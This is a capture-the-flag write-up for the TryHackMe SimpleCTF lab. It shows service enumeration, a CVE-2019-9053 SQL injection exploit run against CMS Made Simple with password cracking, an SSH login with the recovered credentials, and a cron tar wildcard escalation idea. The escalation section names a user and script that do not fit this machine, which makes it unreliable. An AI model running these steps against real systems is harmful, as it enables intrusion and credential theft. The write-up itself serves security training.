# TryHackMe - SimpleCTF  
🔗 https://tryhackme.com/room/simplectf

## 🎯 Objective

The goal of this room is to enumerate services, exploit a vulnerable CMS to obtain credentials, gain access via SSH, and investigate possible privilege escalation vectors.

---

## 🖥️ Target Information

| Property     | Value                                 |
|--------------|----------------------------------------|
| IP Address   | 10.10.193.179                          |
| OS           | Linux Kernel 3.10–3.13 (detected)      |
| FTP Service  | vsftpd 3.0.3                           |
| Web Server   | Apache 2.4.18 (Ubuntu)                 |
| SSH Server   | OpenSSH 7.2p2 (Ubuntu), Port 2222      |

---

## 🔍 1. Enumeration

### 🔧 Nmap Scan

Command:
nmap -sV -O 10.10.193.179

- Results:
    - 21/tcp open  ftp     vsftpd 3.0.3
    - 80/tcp open  http    Apache httpd 2.4.18
    - 2222/tcp open ssh     OpenSSH 7.2p2 Ubuntu
- OS Fingerprint: Linux 3.10 - 3.13

---

### 🔍 Directory Enumeration with Gobuster

Command:
gobuster dir -u http://10.10.193.179 -w /usr/share/wordlists/dirb/common.txt -x php

- Discovered paths:
    - `/simple`
    - `/simple/admin`
    - `/simple/uploads`

💡 The `/simple/` path contains a CMS interface with login and file functionality.

---

## 🔎 2. Vulnerability Analysis

CMS: **CMS Made Simple 2.2.8**  
Vulnerability: **SQL Injection & Password Disclosure** (CVE-2019-9053)

Reference:
https://qiita.com/kaz_tak/items/81e19452a5c1fc5edc3e

Exploit:
```bash
python3 exploit.py -u http://10.10.193.179/simple -c -w /path/to/rockyou.txt -t 5
```

Result:
- Username: `mitch`
- Password (cracked): `secret`

---

## 💥 3. Exploitation

SSH Login:
```bash
ssh mitch@10.10.193.179 -p 2222
```

✅ Access obtained as user `mitch`.

---

## 🔓 4. Privilege Escalation

### 🔍 Crontab Investigation

Backup script found:
```
/home/milesdyson/backups/backup.sh
```

View contents:
```bash
cat /home/milesdyson/backups/backup.sh
```

Script:
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

💡 Scheduled task runs `tar` on web directory. Potential injection point if `/var/www/html` is writable.

---

## ✅ Summary

| Phase                | Status                  |
|---------------------|-------------------------|
| Enumeration          | ✅ Completed            |
| CMS Exploitation     | ✅ Password disclosed   |
| SSH Foothold         | ✅ Gained as mitch      |
| Privilege Escalation | 🕓 In Progress (cron)   |

---
